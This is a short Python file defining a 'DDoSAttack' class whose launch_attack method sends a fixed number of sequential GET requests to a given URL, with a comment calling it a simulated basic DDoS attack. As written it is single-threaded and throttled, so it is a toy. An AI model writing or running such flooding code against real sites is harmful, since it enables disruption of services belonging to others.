import requests
import time

class DDoSAttack:
    def __init__(self):
        pass

    def launch_attack(self, target_url, num_requests=100):
        # Simulate a basic DDoS attack
        for _ in range(num_requests):
            response = requests.get(target_url)
            print(f"Request to {target_url}, Status Code: {response.status_code}")
            time.sleep(0.1) 
